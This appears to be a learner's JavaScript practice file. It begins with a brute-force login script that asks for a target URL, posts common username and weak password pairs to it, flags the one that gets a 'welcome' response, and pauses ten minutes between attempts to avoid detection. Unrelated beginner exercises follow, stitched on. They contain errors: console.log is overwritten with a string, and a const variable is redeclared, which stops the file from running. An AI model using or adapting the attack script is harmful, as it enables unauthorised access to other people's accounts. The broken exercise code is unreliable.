const usernames = ["admin", "user1", "manager"];
const passwords = ["123456", "password", "admin123"];
const loginUrl = prompt("Enter the login page URL:");
async function bruteForceAttack() {
    for (let i = 0; i < usernames.length; i++) {
        for (let j = 0; j < passwords.length; j++) {
            const username = usernames[i];
            const password = passwords[j];

            try {
                const response = await fetch(loginUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: `username=${username}&password=${password}`
                });

                const resultText = await response.text();
                console.log(`Trying ${username}:${password} - Status Code: ${response.status}`);

                if (resultText.toLowerCase().includes("welcome")) {
                    console.log(`%c[SUCCESS] Username: ${username}, Password: ${password}`, "color: green;");
                    return;
                }
            } catch (error) {
                console.error("Error occurred:", error);
            }

            // فاصله زمانی بین تلاش‌ها (۶۰۰ ثانیه = ۱۰ دقیقه)
            await new Promise(resolve => setTimeout(resolve, 600000));
        }
    }

    console.log("Brute Force Attack Completed. No Successful Login Found.");
}
bruteForceAttack();

console.log (1403);
console.log ('ehsan');
const lastname = "Gharibi" ;
console.log = (lastname);

const a = 2;
const b = 536;
console.log (a+b);
const dars = ["Darse yek" , "darse do" , "darse see" , "darse chahar" , "darse panje"]


const darseyek = {fullname : "darseyek " , horse :35 , goz:"z1" , go1:5 ,}
console.log (darseyek)

let data1;
const data2 = null ;
console.log(data2)

console.log (5+3)

const x = 5 ;
const y =2 ;
console.log (x+y)
console.log (x*y)
console.log (x-y)
console.log (x/y)
console.log (x**x)

let x = 4;
console.log (x+1)


